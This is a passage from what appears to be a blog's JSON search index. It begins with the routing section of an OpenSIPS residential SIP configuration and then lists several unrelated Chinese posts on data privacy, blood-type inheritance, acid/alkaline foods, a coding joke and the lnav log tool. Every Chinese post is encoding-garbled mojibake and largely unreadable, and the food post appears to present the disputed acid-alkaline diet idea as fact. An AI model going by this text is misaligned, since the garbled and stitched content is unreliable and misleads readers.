#### ACCounting module loadmodule \u0026#34;acc.so\u0026#34; /* what special events should be accounted ? */ modparam(\u0026#34;acc\u0026#34;, \u0026#34;early_media\u0026#34;, 0) modparam(\u0026#34;acc\u0026#34;, \u0026#34;report_cancels\u0026#34;, 0) /* by default we do not adjust the direct of the sequential requests. if you enable this parameter, be sure to enable \u0026#34;append_fromtag\u0026#34; in \u0026#34;rr\u0026#34; module */ modparam(\u0026#34;acc\u0026#34;, \u0026#34;detect_direction\u0026#34;, 0) loadmodule \u0026#34;proto_udp.so\u0026#34; ####### Routing Logic ######## # main request routing logic route{ if (!mf_process_maxfwd_header(\u0026#34;10\u0026#34;)) { send_reply(\u0026#34;483\u0026#34;,\u0026#34;Too Many Hops\u0026#34;); exit; } if (has_totag()) { # handle hop-by-hop ACK (no routing required) if ( is_method(\u0026#34;ACK\u0026#34;) \u0026amp;\u0026amp; t_check_trans() ) { t_relay(); exit; } # sequential request within a dialog should # take the path determined by record-routing if ( !loose_route() ) { # we do record-routing for all our traffic, so we should not # receive any sequential requests without Route hdr. send_reply(\u0026#34;404\u0026#34;,\u0026#34;Not here\u0026#34;); exit; } if (is_method(\u0026#34;BYE\u0026#34;)) { # do accounting even if the transaction fails do_accounting(\u0026#34;log\u0026#34;,\u0026#34;failed\u0026#34;); } # route it out to whatever destination was set by loose_route() # in $du (destination URI). route(relay); exit; } # CANCEL processing if (is_method(\u0026#34;CANCEL\u0026#34;)) { if (t_check_trans()) t_relay(); exit; } # absorb retransmissions, but do not create transaction t_check_trans(); if ( !(is_method(\u0026#34;REGISTER\u0026#34;) ) ) { if (is_myself(\u0026#34;$fd\u0026#34;)) { } else { # if caller is not local, then called number must be local if (!is_myself(\u0026#34;$rd\u0026#34;)) { send_reply(\u0026#34;403\u0026#34;,\u0026#34;Relay Forbidden\u0026#34;); exit; } } } # preloaded route checking if (loose_route()) { xlog(\u0026#34;L_ERR\u0026#34;, \u0026#34;Attempt to route with preloaded Route\u0026#39;s [$fu/$tu/$ru/$ci]\u0026#34;); if (!is_method(\u0026#34;ACK\u0026#34;)) send_reply(\u0026#34;403\u0026#34;,\u0026#34;Preload Route denied\u0026#34;); exit; } # record routing if (!is_method(\u0026#34;REGISTER|MESSAGE\u0026#34;)) record_route(); # account only INVITEs if (is_method(\u0026#34;INVITE\u0026#34;)) { do_accounting(\u0026#34;log\u0026#34;); } if (!is_myself(\u0026#34;$rd\u0026#34;)) { append_hf(\u0026#34;P-hint: outbound\\r\\n\u0026#34;); route(relay); } # requests for my domain if (is_method(\u0026#34;PUBLISH|SUBSCRIBE\u0026#34;)) { send_reply(\u0026#34;503\u0026#34;, \u0026#34;Service Unavailable\u0026#34;); exit; } if (is_method(\u0026#34;REGISTER\u0026#34;)) { if (!save(\u0026#34;location\u0026#34;)) sl_reply_error(); exit; } if ($rU==NULL) { # request with no Username in RURI send_reply(\u0026#34;484\u0026#34;,\u0026#34;Address Incomplete\u0026#34;); exit; } # do lookup with method filtering if (!lookup(\u0026#34;location\u0026#34;,\u0026#34;m\u0026#34;)) { t_reply(\u0026#34;404\u0026#34;, \u0026#34;Not Found\u0026#34;); exit; } # when routing via usrloc, log the missed calls also do_accounting(\u0026#34;log\u0026#34;,\u0026#34;missed\u0026#34;); route(relay); } route[relay] { # for INVITEs enable some additional helper routes if (is_method(\u0026#34;INVITE\u0026#34;)) { t_on_branch(\u0026#34;per_branch_ops\u0026#34;); t_on_reply(\u0026#34;handle_nat\u0026#34;); t_on_failure(\u0026#34;missed_call\u0026#34;); } if (!t_relay()) { send_reply(\u0026#34;500\u0026#34;,\u0026#34;Internal Error\u0026#34;); } exit; } branch_route[per_branch_ops] { xlog(\u0026#34;new branch at $ru\\n\u0026#34;); } onreply_route[handle_nat] { xlog(\u0026#34;incoming reply\\n\u0026#34;); } failure_route[missed_call] { if (t_was_cancelled()) { exit; } # uncomment the following lines if you want to block client # redirect based on 3xx replies. ##if (t_check_status(\u0026#34;3[0-9][0-9]\u0026#34;)) { ##t_reply(\u0026#34;404\u0026#34;,\u0026#34;Not found\u0026#34;); ##\texit; ##} } ","permalink":"https://wdd.js.org/opensips/ch8/default/","summary":"# # OpenSIPS residential configuration script # by OpenSIPS Solutions \u0026lt;team@opensips-solutions.com\u0026gt; # # This script was generated via \u0026#34;make menuconfig\u0026#34;, from # the \u0026#34;Residential\u0026#34; scenario. # You can enable / disable more features / functionalities by # re-generating the scenario with different options.# # # Please refer to the Core CookBook at: # http://www.opensips.org/Resources/DocsCookbooks # for a explanation of possible statements, functions and parameters. # ####### Global Parameters ######### log_level=3 log_stderror=no log_facility=LOG_LOCAL0 children=4 /* uncomment the following lines to enable debugging */ #debug_mode=yes /* uncomment the next line to enable the auto temporary blacklisting of not available destinations (default disabled) */ #disable_dns_blacklist=no /* uncomment the next line to enable IPv6 lookup after IPv4 dns lookup failures (default disabled) */ #dns_try_ipv6=yes /* comment the next line to enable the auto discovery of local aliases based on reverse DNS on IPs */ auto_aliases=no listen=udp:127.","title":"é»˜è®¤è„šæœ¬"},{"content":"ä¹‹å‰åœ¨ç™¾æ¯’æœç´¢äº†ä¸€ä¸‹è¥å…»å¸ˆè€ƒè¯ï¼Œç„¶åæœ€è¿‘å°±ç»å¸¸æ”¶åˆ°éªšæ‰°ç”µè¯ï¼Œå’¨è¯¢æˆ‘æ˜¯å¦æœ‰æ„å‚åŠ è€ƒè¯•ã€‚\nåœ¨æ²¡æœ‰ç•™ä»»ä½•ç”µè¯å·ç çš„æƒ…å†µä¸‹ï¼Œæˆ‘çš„æ‰‹æœºå·å°±è¢«ç²¾å‡†çš„å®šä½åˆ°ã€‚å¯æƒ³è€ŒçŸ¥ä¸ªäººéšç§é—®é¢˜æ˜¯å¤šä¹ˆä¸¥é‡ã€‚\nä»¥å‰åªæœ‰çš‡å¸ä¸€ä¸ªäººç©¿é€æ˜æ–°è£…ï¼Œç°åœ¨æ¯ä¸ªäººéƒ½ç©¿ç€è¿™ä»¶è¡£æœã€‚\n","permalink":"https://wdd.js.org/posts/2020/04/pgwzdz/","summary":"ä¹‹å‰åœ¨ç™¾æ¯’æœç´¢äº†ä¸€ä¸‹è¥å…»å¸ˆè€ƒè¯ï¼Œç„¶åæœ€è¿‘å°±ç»å¸¸æ”¶åˆ°éªšæ‰°ç”µè¯ï¼Œå’¨è¯¢æˆ‘æ˜¯å¦æœ‰æ„å‚åŠ è€ƒè¯•ã€‚\nåœ¨æ²¡æœ‰ç•™ä»»ä½•ç”µè¯å·ç çš„æƒ…å†µä¸‹ï¼Œæˆ‘çš„æ‰‹æœºå·å°±è¢«ç²¾å‡†çš„å®šä½åˆ°ã€‚å¯æƒ³è€ŒçŸ¥ä¸ªäººéšç§é—®é¢˜æ˜¯å¤šä¹ˆä¸¥é‡ã€‚\nä»¥å‰åªæœ‰çš‡å¸ä¸€ä¸ªäººç©¿é€æ˜æ–°è£…ï¼Œç°åœ¨æ¯ä¸ªäººéƒ½ç©¿ç€è¿™ä»¶è¡£æœã€‚","title":"å¤§æ•°æ®æ—¶ä»£çš„å¹³æ°‘æ–°è£…"},{"content":" ä¹‹å‰çœ‹è¿‡ä¸€ä¸ªæŠ¥é“ï¼Œçˆ¶äº²å‘ç°å„¿å­çš„è¡€å‹å’Œè‡ªå·±ä»¥åŠå¦»å­çš„è¡€å‹éƒ½ä¸ä¸€æ ·ï¼Œæ€€ç–‘å„¿å­ä¸æ˜¯è‡ªå·±äº²ç”Ÿçš„ï¼Œæœ€åæŠŠè‡ªå·±å¦»å„¿å¼„æ­»äº†ã€‚ä½†æ˜¯å­©å­çš„DNAæ£€æµ‹æ˜¾ç¤ºæ˜¯è‡ªå·±äº²ç”Ÿçš„ã€‚\nè¿™æ˜¯ä¸€ä¸ªä¸æ‡‚è¡€å‹ç›¸å…³çŸ¥è¯†çš„æ‚²å‰§å•Šã€‚\nè¡€å‹æ˜¯ç”±çº¢ç»†èƒè¡¨é¢çš„ä¸¤ç§æŠ—åŸå†³å®šçš„ã€‚\nAæŠ—åŸ BæŠ—åŸ è¡€å‹ 1 0 A 0 1 B 1 1 AB 0 0 O ä¸‹å›¾çš„è¡¨æ ¼æ˜¯çˆ¶æ¯è¡€å‹ä¸å­å¥³è¡€å‹çš„å¯èƒ½æ€§ä¸æ¯”ä¾‹ã€‚\nçˆ¶æ¯è¡€å‹ å­å¥³å¯èƒ½æœ‰è¡€å‹åŠæ¯”ä¾‹ å­å¥³ä¸å¯èƒ½æœ‰è¡€å‹ Oã€O O Aã€Bã€AB Oã€A Oã€A ï¼ˆ1ï¼š3ï¼‰ Bã€AB Oã€B Oã€B ï¼ˆ1ï¼š3ï¼‰ Aã€AB Oã€AB Aã€B ï¼ˆ1ï¼š1ï¼‰ Oã€AB Aã€A Oã€A ï¼ˆ1ï¼š15ï¼‰ Bã€AB Aã€B Aã€Bã€ABã€O (3:3:9:1) â€” Aã€AB Aã€Bã€AB ï¼ˆ4ï¼š1ï¼š3ï¼‰ O Bã€B Oã€Bï¼ˆ1ï¼š15ï¼‰ Aã€AB Bã€AB Aã€Bã€ABï¼ˆ1ï¼š4ï¼š3ï¼‰ O ABã€AB Aã€Bã€ABï¼ˆ1ï¼š1ï¼š2ï¼‰ O è™½è¯´å­©å­çš„è¡€å‹ä¸ä¸€å®šå’Œçˆ¶æ¯çš„è¡€å‹ç›¸åŒã€‚ä½†æ˜¯å¦‚æœçˆ¶æ¯éƒ½æ˜¯Oå‹è¡€ï¼Œç”Ÿå‡ºçš„å­©å­å¦‚æœä¸æ˜¯Oå‹ï¼Œé‚£ä¹ˆä¸æ˜¯äº²ç”Ÿçš„å¯èƒ½æ€§ä¹Ÿæ˜¯è›®å¤§çš„ã€‚\n","permalink":"https://wdd.js.org/posts/2020/04/vhovyr/","summary":"ä¹‹å‰çœ‹è¿‡ä¸€ä¸ªæŠ¥é“ï¼Œçˆ¶äº²å‘ç°å„¿å­çš„è¡€å‹å’Œè‡ªå·±ä»¥åŠå¦»å­çš„è¡€å‹éƒ½ä¸ä¸€æ ·ï¼Œæ€€ç–‘å„¿å­ä¸æ˜¯è‡ªå·±äº²ç”Ÿçš„ï¼Œæœ€åæŠŠè‡ªå·±å¦»å„¿å¼„æ­»äº†ã€‚ä½†æ˜¯å­©å­çš„DNAæ£€æµ‹æ˜¾ç¤ºæ˜¯è‡ªå·±äº²ç”Ÿçš„ã€‚\nè¿™æ˜¯ä¸€ä¸ªä¸æ‡‚è¡€å‹ç›¸å…³çŸ¥è¯†çš„æ‚²å‰§å•Šã€‚\nè¡€å‹æ˜¯ç”±çº¢ç»†èƒè¡¨é¢çš„ä¸¤ç§æŠ—åŸå†³å®šçš„ã€‚\nAæŠ—åŸ BæŠ—åŸ è¡€å‹ 1 0 A 0 1 B 1 1 AB 0 0 O ä¸‹å›¾çš„è¡¨æ ¼æ˜¯çˆ¶æ¯è¡€å‹ä¸å­å¥³è¡€å‹çš„å¯èƒ½æ€§ä¸æ¯”ä¾‹ã€‚\nçˆ¶æ¯è¡€å‹ å­å¥³å¯èƒ½æœ‰è¡€å‹åŠæ¯”ä¾‹ å­å¥³ä¸å¯èƒ½æœ‰è¡€å‹ Oã€O O Aã€Bã€AB Oã€A Oã€A ï¼ˆ1ï¼š3ï¼‰ Bã€AB Oã€B Oã€B ï¼ˆ1ï¼š3ï¼‰ Aã€AB Oã€AB Aã€B ï¼ˆ1ï¼š1ï¼‰ Oã€AB Aã€A Oã€A ï¼ˆ1ï¼š15ï¼‰ Bã€AB Aã€B Aã€Bã€ABã€O (3:3:9:1) â€” Aã€AB Aã€Bã€AB ï¼ˆ4ï¼š1ï¼š3ï¼‰ O Bã€B Oã€Bï¼ˆ1ï¼š15ï¼‰ Aã€AB Bã€AB Aã€Bã€ABï¼ˆ1ï¼š4ï¼š3ï¼‰ O ABã€AB Aã€Bã€ABï¼ˆ1ï¼š1ï¼š2ï¼‰ O è™½è¯´å­©å­çš„è¡€å‹ä¸ä¸€å®šå’Œçˆ¶æ¯çš„è¡€å‹ç›¸åŒã€‚ä½†æ˜¯å¦‚æœçˆ¶æ¯éƒ½æ˜¯Oå‹è¡€ï¼Œç”Ÿå‡ºçš„å­©å­å¦‚æœä¸æ˜¯Oå‹ï¼Œé‚£ä¹ˆä¸æ˜¯äº²ç”Ÿçš„å¯èƒ½æ€§ä¹Ÿæ˜¯è›®å¤§çš„ã€‚","title":"å­©å­è¡€å‹ä¸€å®šå’Œçˆ¶æ¯è¡€å‹ç›¸åŒå—ï¼Ÿ"},{"content":"å¤§å¤šæ•°äººå¯èƒ½ç”±ä¸‹é¢çš„ä¸¤ç§æ–¹å¼å»åˆ¤æ–­é£Ÿç‰©çš„é…¸ç¢±æ€§\nèˆŒå¤´ğŸ‘…ã€‚ç”¨å˜´å·´å°ä¸€ä¸‹ï¼Œé…¸çš„é£Ÿç‰©å°±æ˜¯é…¸æ€§çš„ã€‚ phå€¼ã€‚å¯ä»¥ç”¨phè¯•çº¸ ä»¥ä¸Šä¸¤ç§åˆ¤æ–­é£Ÿç‰©é…¸ç¢±æ€§çš„æ–¹æ³•éƒ½æ˜¯é”™è¯¯çš„ã€‚Â é£Ÿç‰©çš„é…¸ç¢±æ€§ï¼Œå–å†³äºé£Ÿç‰©ä¸­å«æœ‰çŸ¿ç‰©è´¨çš„ç§ç±»å’Œå«é‡ã€‚\nç¢±æ€§é£Ÿç‰©ï¼šå«æœ‰é’ ã€é’¾ã€é’™ã€é•ã€é“ é…¸æ€§é£Ÿç‰©ï¼šè¿˜æœ‰ç£·ã€æ°¯ã€ç¡« ä»å…ƒç´ å‘¨æœŸè¡¨ä¸­ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼Œé…¸ç¢±æ€§ç›¸åŒçš„ç‰©è´¨åŸºæœ¬éƒ½æ˜¯æ¯”è¾ƒé è¿‘çš„ã€‚\nå«æœ‰é’ é’¾é’™é•é“çš„é£Ÿç‰©ï¼Œè¿›å…¥äººä½“ä¹‹åï¼Œåœ¨äººä½“çš„æ°§åŒ–ä½œç”¨ä¸‹ï¼Œæœ€ç»ˆä»£è°¢äº§ç‰©å‘ˆç°ç¢±æ€§ã€‚\nå¦å¤–ï¼Œå¤§éƒ¨åˆ†çš„æ°´æœï¼Œä¾‹å¦‚æŸ æª¬ã€æ©™å­ã€è‹¹æœè¿™ç§çš„ï¼Œåƒèµ·æ¥æ˜¯é…¸çš„ï¼Œè€Œå®é™…ä¸Šä»–ä»¬æ˜¯ç¢±æ€§é£Ÿç‰©ã€‚\né£Ÿç‰©åˆ†ç±»è¡¨\né¡¹ç›® ä¸¾ä¾‹ å¼ºé…¸æ€§é£Ÿç‰© ç‰›è‚‰ã€çŒªè‚‰ã€é¸¡è‚‰ã€é‡‘æªé±¼ã€ç‰¡è›ã€æ¯”ç›®é±¼ã€å¥¶é…ªã€ç±³ã€éº¦ã€é¢åŒ…ã€é…’ç±»ã€èŠ±ç”Ÿã€æ ¸æ¡ƒã€ç³–ã€é¥¼å¹²ã€å•¤é…’ç­‰ å¼±é…¸æ€§é£Ÿç‰© ç«è…¿ã€é¸¡è›‹ã€é¾™è™¾ã€ç« é±¼ã€é±¿é±¼ã€èéº¦ã€å¥¶æ²¹ã€è±Œè±†ã€é³—é±¼ã€æ²³é±¼ã€å·§å…‹åŠ›ã€è‘±ã€ç©ºå¿ƒç²‰ã€ç‚¸è±†è…ç­‰ å¼ºç¢±æ€§é£Ÿç‰© èŒ¶ã€ç™½èœã€æŸ¿å­ã€é»„ç“œã€èƒ¡èåœã€è èœã€å·å¿ƒèœã€ç”Ÿèœã€èŠ‹å¤´ã€æµ·å¸¦ã€æŸ‘æ©˜ã€æ— èŠ±æœã€è¥¿ç“œã€è‘¡è„ã€æ¿æ —ã€å’–å•¡ã€è‘¡è„é…’ç­‰ å¼±ç¢±æ€§é£Ÿç‰© è±†è…ã€è±Œè±†ã€å¤§è±†ã€ç»¿è±†ã€ç«¹ç¬‹ã€é©¬é“ƒè–¯ã€é¦™è‡ã€è˜‘è‡ã€æ²¹èœã€å—ç“œã€èŠ¹èœã€ç•ªè–¯ã€è²è—•ã€æ´‹è‘±ã€èŒ„å­ã€èåœã€ç‰›å¥¶ã€è‹¹æœã€æ¢¨ã€é¦™è•‰ã€æ¨±æ¡ƒç­‰ ","permalink":"https://wdd.js.org/posts/2020/04/ly7nlv/","summary":"å¤§å¤šæ•°äººå¯èƒ½ç”±ä¸‹é¢çš„ä¸¤ç§æ–¹å¼å»åˆ¤æ–­é£Ÿç‰©çš„é…¸ç¢±æ€§\nèˆŒå¤´ğŸ‘…ã€‚ç”¨å˜´å·´å°ä¸€ä¸‹ï¼Œé…¸çš„é£Ÿç‰©å°±æ˜¯é…¸æ€§çš„ã€‚ phå€¼ã€‚å¯ä»¥ç”¨phè¯•çº¸ ä»¥ä¸Šä¸¤ç§åˆ¤æ–­é£Ÿç‰©é…¸ç¢±æ€§çš„æ–¹æ³•éƒ½æ˜¯é”™è¯¯çš„ã€‚Â é£Ÿç‰©çš„é…¸ç¢±æ€§ï¼Œå–å†³äºé£Ÿç‰©ä¸­å«æœ‰çŸ¿ç‰©è´¨çš„ç§ç±»å’Œå«é‡ã€‚\nç¢±æ€§é£Ÿç‰©ï¼šå«æœ‰é’ ã€é’¾ã€é’™ã€é•ã€é“ é…¸æ€§é£Ÿç‰©ï¼šè¿˜æœ‰ç£·ã€æ°¯ã€ç¡« ä»å…ƒç´ å‘¨æœŸè¡¨ä¸­ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼Œé…¸ç¢±æ€§ç›¸åŒçš„ç‰©è´¨åŸºæœ¬éƒ½æ˜¯æ¯”è¾ƒé è¿‘çš„ã€‚\nå«æœ‰é’ é’¾é’™é•é“çš„é£Ÿç‰©ï¼Œè¿›å…¥äººä½“ä¹‹åï¼Œåœ¨äººä½“çš„æ°§åŒ–ä½œç”¨ä¸‹ï¼Œæœ€ç»ˆä»£è°¢äº§ç‰©å‘ˆç°ç¢±æ€§ã€‚\nå¦å¤–ï¼Œå¤§éƒ¨åˆ†çš„æ°´æœï¼Œä¾‹å¦‚æŸ æª¬ã€æ©™å­ã€è‹¹æœè¿™ç§çš„ï¼Œåƒèµ·æ¥æ˜¯é…¸çš„ï¼Œè€Œå®é™…ä¸Šä»–ä»¬æ˜¯ç¢±æ€§é£Ÿç‰©ã€‚\né£Ÿç‰©åˆ†ç±»è¡¨\né¡¹ç›® ä¸¾ä¾‹ å¼ºé…¸æ€§é£Ÿç‰© ç‰›è‚‰ã€çŒªè‚‰ã€é¸¡è‚‰ã€é‡‘æªé±¼ã€ç‰¡è›ã€æ¯”ç›®é±¼ã€å¥¶é…ªã€ç±³ã€éº¦ã€é¢åŒ…ã€é…’ç±»ã€èŠ±ç”Ÿã€æ ¸æ¡ƒã€ç³–ã€é¥¼å¹²ã€å•¤é…’ç­‰ å¼±é…¸æ€§é£Ÿç‰© ç«è…¿ã€é¸¡è›‹ã€é¾™è™¾ã€ç« é±¼ã€é±¿é±¼ã€èéº¦ã€å¥¶æ²¹ã€è±Œè±†ã€é³—é±¼ã€æ²³é±¼ã€å·§å…‹åŠ›ã€è‘±ã€ç©ºå¿ƒç²‰ã€ç‚¸è±†è…ç­‰ å¼ºç¢±æ€§é£Ÿç‰© èŒ¶ã€ç™½èœã€æŸ¿å­ã€é»„ç“œã€èƒ¡èåœã€è èœã€å·å¿ƒèœã€ç”Ÿèœã€èŠ‹å¤´ã€æµ·å¸¦ã€æŸ‘æ©˜ã€æ— èŠ±æœã€è¥¿ç“œã€è‘¡è„ã€æ¿æ —ã€å’–å•¡ã€è‘¡è„é…’ç­‰ å¼±ç¢±æ€§é£Ÿç‰© è±†è…ã€è±Œè±†ã€å¤§è±†ã€ç»¿è±†ã€ç«¹ç¬‹ã€é©¬é“ƒè–¯ã€é¦™è‡ã€è˜‘è‡ã€æ²¹èœã€å—ç“œã€èŠ¹èœã€ç•ªè–¯ã€è²è—•ã€æ´‹è‘±ã€èŒ„å­ã€èåœã€ç‰›å¥¶ã€è‹¹æœã€æ¢¨ã€é¦™è•‰ã€æ¨±æ¡ƒç­‰ ","title":"é£Ÿç‰©çš„é…¸ç¢±æ€§çš„è¯¯è§£"},{"content":"å¤§å­¦ï¼Œç¼–ç¨‹ä¹‹å¸ˆä½œä¸šï¼Œæ›°ï¼šxxxåŠŸèƒ½ï¼Œè‡³å°‘ä»£ç ä¸‰åƒè¡Œã€‚\nå®¤å‹å‘•å¿ƒæ²¥è¡€ï¼ŒåºŸå¯å¿˜é£Ÿï¼Œä¸œæ‹¼è¥¿å‡‘ã€‚å¥ˆä½•å‡‘åˆ°ä»£ç ä¸€åƒè¡Œã€‚\nå‹ä¸é‡Šç„¶ï¼Œæ€æ€ä¸ä¹ã€‚æ±‚åŠ©äºæˆ‘ã€‚\näºå‘ŠçŸ¥æ›°ï¼šæ­¤äº‹æ˜“å°”ï¼ä½†éœ€å¯ä¹ä¸¤ç“¶ã€ç“œå­ä¸¤åŒ…ã€‚\nå‹æ‚¦ä¹‹ï¼Œæ›°ï¼šè¯·ç¨ç­‰ï¼Œç‰‡åˆ»å›ã€‚\nå‹å³å›ï¼Œä»£ç äº¦æˆã€‚\nå‹é»¯ç„¶é“ï¼šå­ä¹‹åŠŸåŠ›ï¼Œæ— ä¸åŠä¹Ÿã€‚\näºç¬‘æ›°ï¼šæ— ä»–ï¼Œä½†æ‰‹ç†Ÿè€Œã€‚\nå¤šåŠ æ³¨é‡Šå¤šæ¢è¡Œï¼Œä¸€ä¸ç•™ç¥ä¸‰åƒè¡Œã€‚\nğŸ˜‚ğŸ˜‚ğŸ˜‚ğŸ˜‚ğŸ¤£ğŸ¤£ğŸ¤£ğŸ¤£ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…\n","permalink":"https://wdd.js.org/posts/2020/03/wyeo4w/","summary":"å¤§å­¦ï¼Œç¼–ç¨‹ä¹‹å¸ˆä½œä¸šï¼Œæ›°ï¼šxxxåŠŸèƒ½ï¼Œè‡³å°‘ä»£ç ä¸‰åƒè¡Œã€‚\nå®¤å‹å‘•å¿ƒæ²¥è¡€ï¼ŒåºŸå¯å¿˜é£Ÿï¼Œä¸œæ‹¼è¥¿å‡‘ã€‚å¥ˆä½•å‡‘åˆ°ä»£ç ä¸€åƒè¡Œã€‚\nå‹ä¸é‡Šç„¶ï¼Œæ€æ€ä¸ä¹ã€‚æ±‚åŠ©äºæˆ‘ã€‚\näºå‘ŠçŸ¥æ›°ï¼šæ­¤äº‹æ˜“å°”ï¼ä½†éœ€å¯ä¹ä¸¤ç“¶ã€ç“œå­ä¸¤åŒ…ã€‚\nå‹æ‚¦ä¹‹ï¼Œæ›°ï¼šè¯·ç¨ç­‰ï¼Œç‰‡åˆ»å›ã€‚\nå‹å³å›ï¼Œä»£ç äº¦æˆã€‚\nå‹é»¯ç„¶é“ï¼šå­ä¹‹åŠŸåŠ›ï¼Œæ— ä¸åŠä¹Ÿã€‚\näºç¬‘æ›°ï¼šæ— ä»–ï¼Œä½†æ‰‹ç†Ÿè€Œã€‚\nå¤šåŠ æ³¨é‡Šå¤šæ¢è¡Œï¼Œä¸€ä¸ç•™ç¥ä¸‰åƒè¡Œã€‚\nğŸ˜‚ğŸ˜‚ğŸ˜‚ğŸ˜‚ğŸ¤£ğŸ¤£ğŸ¤£ğŸ¤£ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…","title":"ä»£ç å¢è‚¥èµ‹"},{"content":"","permalink":"https://wdd.js.org/posts/2020/03/eaikcr/","summary":"","title":"devicemap  é©±åŠ¨æ¨¡å¼ä¿®æ”¹"},{"content":"lnav, ä¸éœ€è¦æœåŠ¡ç«¯ï¼Œä¸éœ€è¦è®¾ç½®ï¼Œä»ç„¶åŠŸèƒ½å¼ºå¤§åˆ°æ²¡æœ‰æœ‹å‹ã€‚\né€Ÿåº¦ä¸æ€§èƒ½ lnavæ˜¯ä¸€ä¸ªå¯ä»¥è¿è¡Œåœ¨ç»ˆç«¯ä¸Šçš„æ—¥å¿—åˆ†æå·¥å…·ã€‚åŠŸèƒ½éå¸¸å¼ºå¤§ï¼Œå¦‚æœgrepå’Œtailç­‰å‘½ä»¤æ— æ³•æ»¡è¶³ä½ çš„éœ€æ±‚ï¼Œæˆ–è®¸ä½ å¯ä»¥å°è¯•ä¸€ä¸‹lnavã€‚\nlnavçš„å®˜æ–¹ä»“åº“æ˜¯https://github.com/tstack/lnavï¼Œåœ¨macä¸Šå¯ä»¥ä½¿ç”¨ brew install lnavÂ å‘½ä»¤å®‰è£…è¿™ä¸ªå‘½ä»¤ã€‚\nåœ¨æˆ‘çš„4C8Gçš„Macbook Proä¸Šï¼Œæ‰“å¼€ä¸€ä¸ª2.8Gçš„æ—¥å¿—æ–‡ä»¶åˆ°æ¸²æŸ“å‡ºç°ï¼Œéœ€è¦èŠ±è´¹çº¦40sï¼Œå¹³å‡æ¯ç§’è½½å…¥è¶…è¿‡70MBã€‚è½½å…¥æ—¥å¿—å’Œæ¸²æŸ“æ—¶ï¼Œä½¿ç”¨äº†æ¥è¿‘100%çš„CPUã€‚æ¸²æŸ“å®Œæ¯•ï¼Œä½¿ç”¨1.2Gçš„å†…å­˜ç©ºé—´ã€‚\næ€»ä¹‹å‘¢ï¼Œè¿™ä¸ªå·¥å…·è½½å…¥æ—¥å¿—çš„é€Ÿåº¦å¾ˆå¿«ã€‚ä½†æ˜¯æœ€å¥½ä¸è¦å†ç”Ÿäº§ç¯å¢ƒä¸Šä½¿ç”¨è¿™ä¸ªå‘½ä»¤è½½å…¥è¿‡å¤§çš„æ—¥å¿—æ–‡ä»¶ï¼Œå¦åˆ™å¯èƒ½é€ æˆç³»ç»Ÿèµ„æºæ¶ˆè€—å¤ªå¤§çš„é—®é¢˜ã€‚\nåœ¨è½½å…¥2.8Gçš„æ—¥å¿—æ–‡ä»¶å(3200å¤šä¸‡è¡Œ)ï¼Œè¿‡æ»¤æ—¶æ˜¾å¾—éå¸¸å¡é¡¿ï¼Œä½†æ˜¯æŸ¥çœ‹æ—¥å¿—å¹¶ä¸å¡é¡¿ã€‚\nåœ¨lnavçš„æœç´¢å…³é”®å­—ï¼Œä¸‹æ¬¡æ‰“å¼€å…¶ä»–æ—¥å¿—æ—¶ï¼Œlnavä¼šè‡ªåŠ¨æœç´¢è¿™ä¸ªå…³é”®è¯ã€‚è¿™æ˜¯å®ƒçš„Sessionè®°å½•åŠŸèƒ½ï¼Œå¯ä»¥ä½¿ç”¨Ctrl+Ré‡ç½®Sessionã€‚\nlnavçš„ç‰¹ç‚¹\nè¯­æ³•é«˜äº® å„ç§è¿‡æ»¤æ¡ä»¶ å¤šå…³é”®è¯è¿‡æ»¤ å„ç§å¿«æ·è·³è½¬ è‡ªå¸¦ç»Ÿè®¡å’Œå¯è§†åŒ–åŠŸèƒ½ï¼Œæ¯”å¦‚ä½¿ç”¨æ¡å½¢å›¾å±•ç¤ºå•ä½æ—¶é—´å†…çš„æŠ¥é”™å’Œæ—¥å¿—æ•°é‡ è‡ªåŠ¨æ—¥å¿—æ ¼å¼æ£€æŸ¥ã€‚æ”¯æŒå¾ˆå¤šç§æ—¥å¿—æ ¼å¼ èƒ½å¤ŸæŒ‰ç…§æ—¶é—´å»è¿‡æ»¤æ—¥å¿— TABè‡ªåŠ¨è¡¥å…¨ å®æ—¶æ“ä½œ æ”¯æŒSQLè¯­æ³•æŸ¥æ—¥å¿— æ”¯æŒæ–‡ä»¶å¯¼å‡ºæˆå…¶ä»–æ ¼å¼ æ”¯æŒç›´æ¥æ‰“å¼€tar.gzç­‰å‹ç¼©åçš„æ—¥å¿—æ–‡ä»¶ æ”¯æŒå¾ˆå¤šå¿«æ·é”® xä¸‹é¢æ˜¯æŒ‰å¤©çš„æ—¥å¿—ç»Ÿè®¡ï¼Œç°è‰²æ˜¯æ™®é€šæ—¥å¿—ï¼Œé»„è‰²æ˜¯å‘Šè­¦æ—¥å¿—ï¼Œçº¢è‰²çš„é”™è¯¯æ—¥å¿—ã€‚ä¸‰ç§é¢œè‰²å åŠ çš„é•¿åº¦å°±æ˜¯æ€»æ—¥å¿—ã€‚æ—¶é—´è·¨åº¦å•ä½ä¹Ÿæ˜¯å¯ä»¥è°ƒèŠ‚çš„ã€‚æœ€å¤§è·¨åº¦æ˜¯ä¸€å¤©ï¼Œæœ€çŸ­è·¨åº¦æ˜¯1ç§’ã€‚\nä»ç„¶æ˜¯æ—¥å¿—æ ¼å¼ è‡ªåŠ¨æ—¥å¿—æ ¼å¼æ£€æµ‹ ç³»ç»Ÿæ—¥å¿— WebæœåŠ¡å™¨è®¿é—®æ—¥å¿— æŠ¥é”™æ—¥å¿— ç­‰ç­‰ è¿‡æ»¤ å¯ä»¥è®¾ç½®å¤šä¸ªè¿‡æ»¤è§„åˆ™ æ—¶é—´çº¿è¿‡æ»¤ ç²¾ç¡®æ—¶é—´çš„æ—¥å¿— ä¸Šä¸ªå°æ—¶ï¼Œä¸‹ä¸ªå°æ—¶ ä¸Šä¸€åˆ†é’Ÿï¼Œä¸‹ä¸€åˆ†é’Ÿ èƒ½å¤ŸæŒ‰ç…§æ—¶é—´å»è¿½è¸ªæ—¥å¿—\næŒ‰ç…§æ—¶é—´å‘¨æœŸç»Ÿè®¡ ç»Ÿè®¡æ¯ç§’å‡ºç°çš„é”™è¯¯ï¼Œå‘Šè­¦å’Œæ€»æ—¥å¿—çš„é‡ è¯­æ³•é«˜äº® Tabé”®è‡ªåŠ¨è¡¥å…¨ å‚è€ƒ https://lnav.readthedocs.io/en/latest/ å¦‚æœä½ æ›´å–œæ¬¢GUIå·¥å…·ï¼Œé‚£ä¹Ÿå¯ä»¥è¯•è¯•https://github.com/nickbnf/glogg 